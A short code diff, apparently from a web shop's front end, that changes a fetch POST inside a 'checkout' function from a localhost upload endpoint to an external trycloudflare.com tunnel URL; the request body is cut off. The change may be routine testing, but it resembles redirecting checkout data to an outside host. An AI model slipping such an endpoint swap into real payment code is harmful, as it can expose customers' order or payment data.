@@ -242,7 +242,7 @@ const checkout = () => {
             };
         });
 
-        fetch('http://localhost:8080/upload', {
+        fetch('https://mo-considerations-sheets-bolivia.trycloudflare.com/upload', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
